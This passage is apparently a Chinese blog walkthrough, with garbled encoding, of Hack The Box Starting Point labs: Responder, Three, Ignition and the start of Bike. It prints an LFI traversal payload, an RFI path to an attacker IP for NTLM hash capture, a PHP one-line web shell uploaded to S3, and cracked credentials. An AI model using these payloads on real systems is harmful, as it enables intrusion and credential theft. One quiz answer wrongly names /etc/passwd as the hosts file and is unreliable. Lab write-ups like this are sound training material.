<li>ä½¿ç”¨ ftp å®¢æˆ·ç«¯è¿æ¥åˆ° FTP æœåŠ¡å™¨åï¼Œå½“æç¤ºåŒ¿åç™»å½•æ—¶ï¼Œæˆ‘ä»¬æä¾›ä»€ä¹ˆç”¨æˆ·åï¼Ÿï¼š<code>anonymous</code></li>
<li>åŒ¿åè¿æ¥åˆ°FTPæœåŠ¡å™¨åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»€ä¹ˆå‘½ä»¤æ¥ä¸‹è½½æˆ‘ä»¬åœ¨FTPæœåŠ¡å™¨ä¸Šæ‰¾åˆ°çš„æ–‡ä»¶å‘¢ï¼Ÿï¼š<code>get</code></li>
<li>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Gobuster çš„ä»€ä¹ˆå¼€å…³æ¥æŒ‡å®šæˆ‘ä»¬æ­£åœ¨å¯»æ‰¾ç‰¹å®šçš„æ–‡ä»¶ç±»å‹ï¼š<code>-x</code></li>
</ol>
</blockquote>
<h3 id="è¿‡ç¨‹-8"><a href="#è¿‡ç¨‹-8" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ftp</span> <span class="number">10.129.33.176</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/htb(STARTING-POINT)/image-20230130000838109.png" alt="image-20230130000838109"></p>
<p><img src="/post/htb(STARTING-POINT)/image-20230130000857706.png" alt="image-20230130000857706"></p>
<p>æ‰«ææ‰¾åˆ°ç™»å½•é¡µé¢</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">dirsearch</span> -u <span class="number">10.129.33.176</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/htb(STARTING-POINT)/image-20230130002433765.png" alt="image-20230130002433765"></p>
<p>ç„¶åæŠ“åŒ…å­—å…¸çˆ†ç ´å¾—åˆ°è´¦å·å¯†ç ï¼Œç™»å½•å¾—åˆ°flag</p>
<p><img src="/post/htb(STARTING-POINT)/image-20230130003936082.png" alt="image-20230130003936082"></p>
<h2 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h2><h3 id="Tags-11"><a href="#Tags-11" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>WinRM</code></p>
<p><code>ç½‘ç»œ</code></p>
<p><code>ä¼ ç»Ÿåº”ç”¨</code></p>
<p><code>åè®®</code></p>
<p><code>XAMPP</code></p>
<p><code>SMB</code></p>
<p><code>Responder</code></p>
<p><code>PHP</code></p>
<p><code>æ¸—é€æµ‹è¯•ä»ª 1 çº§</code></p>
<p><code>ä¾¦å¯Ÿ</code></p>
<p><code>å¯†ç ç ´è§£</code></p>
<p><code>å“ˆå¸Œæ•è·</code></p>
<p><code>è¿œç¨‹æ–‡ä»¶åŒ…å«</code></p>
<p><code>è¿œç¨‹ä»£ç æ‰§è¡Œ</code></p>
</blockquote>
<h3 id="çŸ¥è¯†ç‚¹-11"><a href="#çŸ¥è¯†ç‚¹-11" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote>
<ol>
<li>ç”¨äºåŠ è½½ç½‘é¡µä¸åŒè¯­è¨€ç‰ˆæœ¬çš„ URL å‚æ•°çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿ:<code>page</code></li>
<li>page å‚æ•°çš„ä»¥ä¸‹å“ªäº›å€¼æ˜¯åˆ©ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å« (LFI) æ¼æ´çš„ç¤ºä¾‹:<code>../../../../../../../../windows/system32/drivers/etc/hosts</code></li>
<li>page å‚æ•°çš„ä»¥ä¸‹å“ªäº›å€¼æ˜¯åˆ©ç”¨è¿œç¨‹æ–‡ä»¶åŒ…å« (RFI) æ¼æ´çš„ç¤ºä¾‹ï¼š<code>//10.10.14.6/somefile</code></li>
<li>NTLM ä»£è¡¨ä»€ä¹ˆï¼Ÿ:<code>New Technology LAN Manager</code></li>
<li>åœ¨ Responder å®ç”¨ç¨‹åºä¸­ä½¿ç”¨å“ªä¸ªæ ‡å¿—æ¥æŒ‡å®šç½‘ç»œæ¥å£ï¼Ÿï¼š<code>-i</code></li>
<li>æœ‰å‡ ç§å·¥å…·å¯ä»¥æ¥å— NetNTLMv2 è´¨è¯¢&#x2F;å“åº”å¹¶å°è¯•æ•°ç™¾ä¸‡ä¸ªå¯†ç ä»¥æŸ¥çœ‹å…¶ä¸­æ˜¯å¦æœ‰ä»»ä½•ä¸€ä¸ªç”Ÿæˆç›¸åŒçš„å“åº”ã€‚ä¸€ç§è¿™æ ·çš„å·¥å…·é€šå¸¸è¢«ç§°ä¸º <code>john</code>ï¼Œä½†å…¨åæ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>John the Ripper</code></li>
</ol>
</blockquote>
<h4 id="ä»€ä¹ˆæ˜¯smbï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯smbï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯smbï¼Ÿ"></a>ä»€ä¹ˆæ˜¯smbï¼Ÿ</h4><blockquote>
<p><em>SMB</em>(å…¨ç§°æ˜¯Server Message Block)æ˜¯ä¸€ä¸ªç½‘ç»œåè®®åï¼Œå®ƒèƒ½è¢«ç”¨äºWebè¿æ¥å’Œå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´çš„ä¿¡æ¯æ²Ÿé€šã€‚</p>
</blockquote>
<h4 id="ä»€ä¹ˆæ˜¯WinRMï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯WinRMï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯WinRMï¼Ÿ"></a>ä»€ä¹ˆæ˜¯WinRMï¼Ÿ</h4><blockquote>
<p><strong>WinRM</strong>ï¼ˆ<strong>Windows è¿œç¨‹ç®¡ç†</strong>ï¼Œ<strong>Windows Remote Management</strong>ï¼‰æ˜¯<a href="https://zh.m.wikipedia.org/wiki/WEB%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86">WEBæœåŠ¡ç®¡ç†</a>äº<a href="https://zh.m.wikipedia.org/wiki/%E5%BE%AE%E8%BD%AF">å¾®è½¯</a>çš„<a href="https://zh.m.wikipedia.org/wiki/Microsoft_Windows">Microsoft Windows</a>ä¸­çš„<a href="https://zh.m.wikipedia.org/wiki/%E5%AF%A6%E7%8F%BE">å®ç°</a>ï¼Œå®ƒå…è®¸å¤„äºä¸€ä¸ªå…±åŒ<a href="https://zh.m.wikipedia.org/wiki/%E7%B6%B2%E7%B5%A1">ç½‘ç»œ</a>å†…çš„<a href="https://zh.m.wikipedia.org/wiki/Microsoft_Windows">Microsoft Windows</a>è®¡ç®—æœºå½¼æ­¤ä¹‹é—´äº’ç›¸è®¿é—®å’Œäº¤æ¢ä¿¡æ¯ã€‚åœ¨ä¸€å°æœºå™¨å¯ç”¨WinRMåï¼Œå¦ä¸€å°æœºå™¨å°±èƒ½é€šè¿‡<a href="https://zh.m.wikipedia.org/wiki/Windows_PowerShell">Windows PowerShell</a>å¯¹å¼€å¯WinRMçš„æœºå™¨è¿›è¡Œ<a href="https://zh.m.wikipedia.org/wiki/%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86">è¿œç¨‹ç®¡ç†</a></p>
</blockquote>
<h4 id="ä»€ä¹ˆæ˜¯XAMPPï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯XAMPPï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯XAMPPï¼Ÿ"></a>ä»€ä¹ˆæ˜¯XAMPPï¼Ÿ</h4><blockquote>
<p>XAMPPï¼ˆ<a href="https://baike.baidu.com/item/Apache/6265">Apache</a>+MySQL+<a href="https://baike.baidu.com/item/PHP/9337">PHP</a>+PERLï¼‰æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„å»ºç«™é›†æˆ<a href="https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6%E5%8C%85/10508451">è½¯ä»¶åŒ…</a>ã€‚è¿™ä¸ªè½¯ä»¶åŒ…åŸæ¥çš„åå­—æ˜¯ LAMPPï¼Œä½†æ˜¯ä¸ºäº†é¿å…è¯¯è§£ï¼Œæœ€æ–°çš„å‡ ä¸ªç‰ˆæœ¬å°±æ”¹åä¸º XAMPP äº†ã€‚å®ƒå¯ä»¥åœ¨Windowsã€<a href="https://baike.baidu.com/item/Linux/27050">Linux</a>ã€<a href="https://baike.baidu.com/item/Solaris/3517">Solaris</a>ã€[Mac OS X](<a href="https://baike.baidu.com/item/Mac">https://baike.baidu.com/item/Mac</a> OS X&#x2F;470629) ç­‰å¤šç§æ“ä½œç³»ç»Ÿä¸‹å®‰è£…ä½¿ç”¨ï¼Œæ”¯æŒå¤šè¯­è¨€ï¼šè‹±æ–‡ã€ç®€ä½“ä¸­æ–‡ã€<a href="https://baike.baidu.com/item/%E7%B9%81%E4%BD%93%E4%B8%AD%E6%96%87/2677789">ç¹ä½“ä¸­æ–‡</a>ã€<a href="https://baike.baidu.com/item/%E9%9F%A9%E6%96%87/20585">éŸ©æ–‡</a>ã€<a href="https://baike.baidu.com/item/%E4%BF%84%E6%96%87/5491693">ä¿„æ–‡</a>ã€æ—¥æ–‡ç­‰ã€‚</p>
</blockquote>
<h4 id="ä»€ä¹ˆæ˜¯NTLMï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯NTLMï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯NTLMï¼Ÿ"></a>ä»€ä¹ˆæ˜¯NTLMï¼Ÿ</h4><blockquote>
<p>NTLMæ˜¯Windows æ–°æŠ€æœ¯ LAN ç®¡ç†å™¨(NTLM) æ˜¯ Microsoft æä¾›çš„ä¸€å¥—å®‰å…¨åè®®ï¼Œç”¨äºéªŒè¯ç”¨æˆ·èº«ä»½å¹¶ä¿æŠ¤å…¶æ´»åŠ¨çš„å®Œæ•´æ€§å’Œæœºå¯†æ€§ã€‚</p>
<p>æŒ‡telnet çš„ä¸€ç§<code>éªŒè¯èº«ä»½æ–¹å¼</code>ï¼Œå³é—®è¯¢&#x2F;åº”ç­”èº«ä»½éªŒè¯åè®®ï¼Œæ˜¯Windows NT æ—©æœŸç‰ˆæœ¬çš„æ ‡å‡†å®‰å…¨åè®®ï¼ŒWindows 2000 æ”¯æŒNTLM æ˜¯ä¸ºäº†ä¿æŒå‘åå…¼å®¹ã€‚ Windows 2000å†…ç½®ä¸‰ç§åŸºæœ¬å®‰å…¨åè®®ä¹‹ä¸€ã€‚</p>
</blockquote>
<h4 id="ä»€ä¹ˆæ˜¯Responderï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯Responderï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯Responderï¼Ÿ"></a>ä»€ä¹ˆæ˜¯Responderï¼Ÿ</h4><blockquote>
<p>Responderå°±æ˜¯è¿™æ ·ä¸€ç§<code>åˆ©ç”¨èº«ä»½è®¤è¯åè®®ï¼Œç›‘å¬è·å–å£ä»¤å“ˆå¸Œ</code>çš„å·¥å…·ã€‚ å¦‚æœ<strong>å®¢æˆ·ç«¯&#x2F;ç›®æ ‡æ— æ³•é€šè¿‡DNSåŸŸåè§£æï¼Œåˆ™ä¼šå›é€€åˆ°LLMNRï¼ˆåœ¨Windows Vistaä¸­å¼•å…¥ï¼‰å’ŒNBT-NSè¿›è¡Œè§£æ</strong>ã€‚ <code>LLMNR</code>ï¼ˆé“¾è·¯æœ¬åœ°å¤šæ’­åç§°è§£æï¼‰ï¼šå¤šæ’­æ–¹å¼æŸ¥æ‰¾ç½‘ç»œä¸Šçš„ä¸»æœºï¼Œå…¶å®ƒä¸»æœºå“åº”IPï¼Œç„¶åè¿æ¥ã€‚</p>
</blockquote>
<h4 id="ä»€ä¹ˆæ˜¯evil-winrmï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯evil-winrmï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯evil-winrmï¼Ÿ"></a>ä»€ä¹ˆæ˜¯evil-winrmï¼Ÿ</h4><blockquote>
<p>evil-winrmæ˜¯<code>Windows</code>è¿œç¨‹ç®¡ç†(WinRM) Shellçš„ç»ˆæç‰ˆæœ¬ã€‚ Windowsè¿œç¨‹ç®¡ç†æ˜¯â€œWS ç®¡ç†åè®®çš„Microsoft å®æ–½ï¼Œè¯¥åè®®æ˜¯åŸºäºæ ‡å‡†SOAPã€ä¸å—é˜²ç«å¢™å½±å“çš„åè®®ï¼Œå…è®¸ä¸åŒä¾›åº”å•†çš„ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿç›¸äº’æ“ä½œã€‚</p>
</blockquote>
<h3 id="è¿‡ç¨‹-9"><a href="#è¿‡ç¨‹-9" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h3><p>å¯åŠ¨<code>responder</code>å¹¶æŒ‡å®š<strong>ç›‘å¬</strong>æœ¬åœ°çš„<code>tun0</code>ç½‘å¡ï¼Œ</p>
<p>ç„¶åç”±äºé¶æœºå­˜åœ¨<code>RFI</code>ï¼Œå› æ­¤å¯ä»¥è¿œç¨‹è®¿é—®æœ¬åœ°çš„æŸä¸ªæ–‡ä»¶ï¼Œä½¿ç”¨<code>responder</code>æ‹¿åˆ°ä¸»æœºçš„<code>administrator</code>çš„<strong>å“ˆå¸Œ</strong>ï¼Œç„¶åä½¿ç”¨<code>john</code>ç ´è§£ã€‚</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">responder -<span class="selector-tag">I</span> tun0</span><br></pre></td></tr></table></figure>

<p><img src="/post/htb(STARTING-POINT)/image-20230130222039665.png" alt="image-20230130222039665"></p>
<blockquote>
<p>è®¿é—®<code>http://unika.htb/index.php?page=//10.10.16.28/somefile</code></p>
<p>[éœ€è¦å…ˆä¿®æ”¹<code>hosts</code>æ–‡ä»¶ï¼ŒæŠŠé‡å®šå‘ipä¿®æ”¹åˆ°å¯¹åº”åŸŸå]</p>
<p>è¿™é‡Œipä¸ºæœ¬åœ°tun0ç½‘å¡ip</p>
</blockquote>
<p><img src="/post/htb(STARTING-POINT)/image-20230130225041057.png" alt="image-20230130225041057"></p>
<p><img src="/post/htb(STARTING-POINT)/image-20230130225118212.png" alt="image-20230130225118212"></p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">john -t <span class="built_in">hash</span>.txt</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°å¯†ç </p>
<p>evil-winrmç™»å½•</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">evil-winrm -<span class="selector-tag">i</span> <span class="number">10.129</span>.<span class="number">198.112</span> -u Administrator -<span class="selector-tag">p</span> badminton</span><br></pre></td></tr></table></figure>

<p><img src="/post/htb(STARTING-POINT)/image-20230130232209879.png" alt="image-20230130232209879"></p>
<p><code>flag</code>åœ¨<code>mike</code>ç”¨æˆ·çš„<code>Desktop</code>ç›®å½•ä¸­</p>
<h2 id="Three"><a href="#Three" class="headerlink" title="Three"></a>Three</h2><h3 id="Tags-12"><a href="#Tags-12" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>ç½‘ç»œ</code></p>
<p><code>Cloud</code></p>
<p><code>ä¼ ç»Ÿåº”ç”¨</code></p>
<p><code>AWS</code></p>
<p><code>æ¸—é€æµ‹è¯•ä»ª 1 çº§</code></p>
<p><code>ä¾¦å¯Ÿ</code></p>
<p><code>ç½‘ç«™ç»“æ„å‘ç°</code></p>
<p><code>æ¡¶æšä¸¾</code></p>
<p><code>ä»»æ„æ–‡ä»¶ä¸Šä¼ </code></p>
<p><code>åŒ¿å/è®¿å®¢è®¿é—®</code></p>
</blockquote>
<h3 id="çŸ¥è¯†ç‚¹-12"><a href="#çŸ¥è¯†ç‚¹-12" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote>
<ol>
<li>å“ªä¸ªå‘½ä»¤è¡Œå®ç”¨ç¨‹åºå¯ç”¨äºä¸åœ¨å·²å‘ç°çš„å­åŸŸä¸Šè¿è¡Œçš„æœåŠ¡è¿›è¡Œäº¤äº’ï¼Ÿï¼š<code>awscli</code></li>
<li>å“ªä¸ªå‘½ä»¤ç”¨äºè®¾ç½® AWS CLI å®‰è£…ï¼Ÿï¼š<code>aws configure</code></li>
<li>ä¸Šè¿°å®ç”¨ç¨‹åºç”¨äºåˆ—å‡ºæ‰€æœ‰ S3 å­˜å‚¨æ¡¶çš„å‘½ä»¤æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>aws s3 ls</code></li>
</ol>
</blockquote>
<h4 id="ä»€ä¹ˆæ˜¯awsï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯awsï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯awsï¼Ÿ"></a>ä»€ä¹ˆæ˜¯awsï¼Ÿ</h4><blockquote>
<p>äºšé©¬é€Š<code>AWSï¼ˆAmazon Web Services (AWS) ï¼‰</code>æ˜¯äºšé©¬é€Šæä¾›çš„<code>æ˜¯å…¨çƒæœ€å…¨é¢ã€åº”ç”¨æœ€å¹¿æ³›çš„äº‘å¹³å°</code>ï¼Œä»å…¨çƒæ•°æ®ä¸­å¿ƒæä¾›è¶…è¿‡ 200 é¡¹åŠŸèƒ½é½å…¨çš„æœåŠ¡ã€‚æ•°ç™¾ä¸‡å®¢æˆ·(åŒ…æ‹¬å¢<code>é•¿æœ€å¿«é€Ÿçš„åˆåˆ›å…¬å¸ã€æœ€å¤§å‹ä¼ä¸šå’Œä¸»è¦çš„æ”¿åºœæœºæ„)éƒ½åœ¨ä½¿ç”¨ AWS</code> æ¥é™ä½æˆæœ¬ã€æé«˜æ•æ·æ€§å¹¶åŠ é€Ÿåˆ›æ–°ã€‚</p>
</blockquote>
<h4 id="ä»€ä¹ˆæ˜¯awscliï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯awscliï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯awscliï¼Ÿ"></a>ä»€ä¹ˆæ˜¯awscliï¼Ÿ</h4><blockquote>
<p><code>AWS å‘½ä»¤è¡Œç•Œé¢ï¼ˆAWS CLIï¼‰</code>æ˜¯ç”¨äºç®¡ç†AWS äº§å“çš„ç»Ÿä¸€å·¥å…·ã€‚ åªéœ€è¦ä¸‹è½½å’Œé…ç½®ä¸€ä¸ªå·¥å…·ï¼Œæ‚¨å°±å¯ä»¥ä½¿ç”¨å‘½ä»¤è¡Œæ§åˆ¶å¤šä¸ªAWS äº§å“å¹¶<code>åˆ©ç”¨è„šæœ¬</code>æ¥è‡ªåŠ¨æ‰§è¡Œè¿™äº›æœåŠ¡</p>
</blockquote>
<h4 id="ä»€ä¹ˆæ˜¯-Amazon-S3ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-Amazon-S3ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ Amazon S3ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ Amazon S3ï¼Ÿ</h4><blockquote>
<p>Amazon Simple Storage Serviceï¼ˆAmazon S3ï¼‰æ˜¯ä¸€ç§<code>å¯¹è±¡å­˜å‚¨æœåŠ¡</code>ï¼Œæä¾›è¡Œä¸šé¢†å…ˆçš„å¯æ‰©å±•æ€§ã€æ•°æ®å¯ç”¨æ€§ã€å®‰å…¨æ€§å’Œæ€§èƒ½ã€‚å„ç§è§„æ¨¡å’Œè¡Œä¸šçš„å®¢æˆ·éƒ½å¯ä»¥ä½¿ç”¨ Amazon S3 å­˜å‚¨å’Œä¿æŠ¤ä»»æ„æ•°é‡çš„æ•°æ®ï¼Œ<code>ç”¨äºæ•°æ®æ¹–ã€ç½‘ç«™ã€ç§»åŠ¨åº”ç”¨ç¨‹åºã€å¤‡ä»½å’Œæ¢å¤ã€å½’æ¡£ã€ä¼ä¸šåº”ç”¨ç¨‹åºã€IoT è®¾å¤‡å’Œå¤§æ•°æ®åˆ†æ</code>ã€‚Amazon S3 æä¾›äº†ç®¡ç†åŠŸèƒ½ï¼Œä½¿æ‚¨å¯ä»¥ä¼˜åŒ–ã€ç»„ç»‡å’Œé…ç½®å¯¹æ•°æ®çš„è®¿é—®ï¼Œä»¥æ»¡è¶³æ‚¨çš„ç‰¹å®šä¸šåŠ¡ã€ç»„ç»‡å’Œåˆè§„æ€§è¦æ±‚ã€‚</p>
</blockquote>
<h4 id="ä»€ä¹ˆæ˜¯Bucket-Enumeration-å­˜å‚¨æ¡¶æšä¸¾-ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯Bucket-Enumeration-å­˜å‚¨æ¡¶æšä¸¾-ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯Bucket Enumeration(å­˜å‚¨æ¡¶æšä¸¾)ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯Bucket Enumeration(å­˜å‚¨æ¡¶æšä¸¾)ï¼Ÿ</h4><blockquote>
<p><code>S3 å­˜å‚¨æ¡¶æšä¸¾</code>æ˜¯æŸ¥è¯¢ S3 å­˜å‚¨æ¡¶å’Œè¿™äº›å­˜å‚¨æ¡¶ä¸­çš„å¯¹è±¡çš„è¿‡ç¨‹ã€‚è¿™å¯ä»¥ä½¿ç”¨ä¸åŒçš„ AWS API è°ƒç”¨æ¥å®Œæˆï¼Œä¾‹å¦‚åˆ—å‡ºå­˜å‚¨æ¡¶ã€è·å–å­˜å‚¨æ¡¶å†…å®¹æˆ– ListObjectsã€‚æ­¤è¿‡ç¨‹æ—¨åœ¨ç¡®å®šç»™å®šå­˜å‚¨æ¡¶ä¸­å­˜åœ¨å“ªäº› S3 å¯¹è±¡ã€‚æ‚¨å¯ä»¥ä½¿ç”¨æ­¤ä¿¡æ¯æ¥å¸®åŠ©æ‚¨æ›´å¥½åœ°äº†è§£æ‚¨çš„æ•°æ®èµ„æºï¼Œå¹¶å°±å¦‚ä½•æœ€å¥½åœ°ç®¡ç†å®ƒåšå‡ºå†³å®šã€‚</p>
</blockquote>
<h3 id="è¿‡ç¨‹-10"><a href="#è¿‡ç¨‹-10" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h3><p><code>gobuster</code>çˆ†ç ´å­åŸŸå</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">gobuster vhost -w <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>subdomains-top1million-<span class="number">5000</span>.txt -u http:<span class="regexp">//</span>thetoppers.htb</span><br></pre></td></tr></table></figure>

<p>åˆ—å‡ºè¯¥<code>s3å­˜å‚¨æ¡¶</code>ä¸‹çš„å†…å®¹</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">aws s3 <span class="keyword">ls</span> <span class="params">--endpoint=http</span>:<span class="string">//s3.thetoppers.htb/</span> s3:<span class="string">//thetoppers.htb</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/htb(STARTING-POINT)/image-20230131004300879.png" alt="image-20230131004300879"></p>
<p>æœ¬åœ°å†™ä¸€ä¸ª<code>ä¸€å¥è¯æœ¨é©¬è„šæœ¬</code></p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">echo &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&#x27; &gt; shell.php </span></span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ æœ¬åœ°ä¸€å¥è¯æœ¨é©¬åˆ°s3å­˜å‚¨æ¡¶</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">aws</span> <span class="built_in">s3</span> <span class="meta">cp</span> shell.php --endpoint<span class="symbol">=http</span>:<span class="comment">//s3.thetoppers.htb/ s3://thetoppers.htb </span></span><br></pre></td></tr></table></figure>

<p><img src="/post/htb(STARTING-POINT)/image-20230131004712717.png" alt="image-20230131004712717"></p>
<p>è®¿é—®çœ‹çœ‹æ˜¯å¦æˆåŠŸ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://thetoppers.htb/shell.php?cmd=<span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/htb(STARTING-POINT)/image-20230131004810309.png" alt="image-20230131004810309"></p>
<p>ç„¶åèšå‰‘è¿æ¥ä¹Ÿè¡Œï¼Œä½†htbçš„vpnä¸èµ°ä¸»æœºè¿ä¸ä¸Š</p>
<p>æ‰€ä»¥å¯ä»¥åˆ©ç”¨ncåå¼¹shellï¼Œä¹Ÿå¯ä»¥ç›´æ¥åˆ©ç”¨è„šæœ¬åœ¨è¿›è¡Œå‘½ä»¤æ‰§è¡Œè¯»å–flag</p>
<p><img src="/post/htb(STARTING-POINT)/image-20230131005440119.png" alt="image-20230131005440119"></p>
<h2 id="Ignition"><a href="#Ignition" class="headerlink" title="Ignition"></a>Ignition</h2><h3 id="Tags-13"><a href="#Tags-13" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>web</code></p>
<p><code>å¸¸è§åº”ç”¨</code></p>
<p><code>Magento</code></p>
<p><code>æ¸—é€æµ‹è¯•å‘˜ 1 çº§</code></p>
<p><code>ä¾¦å¯Ÿ</code></p>
<p><code>ç½‘ç«™ç»“æ„å‘ç°</code></p>
<p><code>å¼±å‡­æ®</code></p>
</blockquote>
<h3 id="çŸ¥è¯†ç‚¹-13"><a href="#çŸ¥è¯†ç‚¹-13" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote>
<ol>
<li>Linux è®¡ç®—æœºä¸Šä¿å­˜åŸŸååˆ° IP åœ°å€å¯¹çš„æœ¬åœ°åˆ—è¡¨çš„æ–‡ä»¶çš„å®Œæ•´è·¯å¾„æ˜¯ä»€ä¹ˆï¼Ÿ:<code>/etc/passwd</code></li>
<li>æŸ¥æ‰¾Magentoçš„å¯†ç è¦æ±‚ï¼Œå¹¶å°è¯•æœç´¢2023å¹´æœ€å¸¸è§çš„å¯†ç ã€‚å“ªä¸ªå¯†ç å¯ä»¥è®¿é—®ç®¡ç†å‘˜å¸æˆ·ï¼Ÿ:<code>qwerty123</code></li>
</ol>
</blockquote>
<h4 id="Magentoæ˜¯ä»€ä¹ˆ"><a href="#Magentoæ˜¯ä»€ä¹ˆ" class="headerlink" title="Magentoæ˜¯ä»€ä¹ˆ"></a>Magentoæ˜¯ä»€ä¹ˆ</h4><blockquote>
<p><strong>Magento</strong>æ˜¯<strong>Adobe</strong>å…¬å¸æ——ä¸‹ä¸€ä¸ªåŠŸèƒ½ä¸°å¯Œçš„<strong>ä¸“ä¸šå¼€æºç”µå­å•†åŠ¡è§£å†³æ–¹æ¡ˆ</strong>ï¼Œä¸ºå•†å®¶æä¾›ä¸€ä¸ªå¤–è§‚ã€å†…å®¹å’ŒåŠŸèƒ½çš„å®Œå…¨çµæ´»æ§åˆ¶ã€‚Magentoç›´è§‚çš„ç®¡ç†ç•Œé¢åŒ…å«å¼ºå¤§çš„<strong>è¥é”€ã€å•†å“æ¨é”€å’Œå†…å®¹ç®¡ç†å·¥å…·</strong>ï¼Œä½¿å•†å®¶èƒ½å¤Ÿåˆ›å»ºé€‚åˆå…¶ç‹¬ç‰¹ä¸šåŠ¡éœ€æ±‚çš„ç«™ç‚¹ã€‚Magentoå·ç§°<strong>å®‡å®™æœ€å¼ºä¼ä¸šç»ˆæç”µå­å•†åŠ¡è§£å†³æ–¹æ¡ˆ</strong></p>
</blockquote>
<h4 id="2023å¹´æ’åå‰åçš„å¯†ç "><a href="#2023å¹´æ’åå‰åçš„å¯†ç " class="headerlink" title="2023å¹´æ’åå‰åçš„å¯†ç "></a>2023å¹´æ’åå‰åçš„å¯†ç </h4><blockquote>
<ol>
<li><code>123456</code></li>
<li><code>123456789</code></li>
<li><code>qwerty</code></li>
<li><code>password</code></li>
<li><code>12345</code></li>
<li><code>qwerty123</code></li>
<li><code>1q2w3e</code></li>
<li><code>12345678</code></li>
<li><code>111111</code></li>
<li><code>1234567890</code></li>
</ol>
</blockquote>
<h2 id="Bike"><a href="#Bike" class="headerlink" title="*Bike"></a>*Bike</h2><h3 id="Tags-14"><a href="#Tags-14" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p>Javascript</p>
<p>Web</p>
<p>Injection</p>
<p>Custom Applications</p>
<p>NodeJS</p>
<p>Penetration Tester Level 1</p>
<p>ä¾¦å¯Ÿ</p>
<p>è¿œç¨‹ä»£ç æ‰§è¡Œ</p>
<p>æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ ï¼ˆSSTIï¼‰</p>
</blockquote>
<h3 id="çŸ¥è¯†ç‚¹-14"><a href="#çŸ¥è¯†ç‚¹-14" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote>
<ol>
<li><p>Node.JS ä¸­ä½¿ç”¨çš„æ¨¡æ¿å¼•æ“æ˜¯ä»€ä¹ˆï¼Ÿ:<code>handlebars</code></p>
</li>
<li><p>ä¸ºäº†åœ¨ HTTP è¯·æ±‚ä¸­å‘é€æœ‰æ•ˆè´Ÿè½½ä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼Œæˆ‘ä»¬å°†å¯¹æœ‰æ•ˆè´Ÿè½½è¿›è¡Œç¼–ç ã€‚æˆ‘ä»¬ä½¿ç”¨ä»€ä¹ˆç±»å‹çš„ç¼–ç ï¼Ÿ:<code>URL</code></p>
</li>
